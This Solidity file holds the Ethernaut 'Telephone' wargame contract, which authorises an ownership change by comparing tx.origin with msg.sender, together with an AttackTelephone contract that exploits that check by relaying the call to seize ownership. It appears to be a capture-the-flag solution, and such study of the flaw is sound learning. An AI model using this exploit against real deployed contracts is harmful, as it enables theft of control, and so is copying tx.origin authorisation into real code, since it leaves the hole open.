// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// Ethenaut contract
contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract AttackTelephone {
    Telephone public telephone;

    constructor(address _address) public {
        telephone = Telephone(_address);
    }

    function takeOwnership(address to) public {
        telephone.changeOwner(to);
    }

    function getOwner() public view returns (address) {
        return telephone.owner();
    }
}
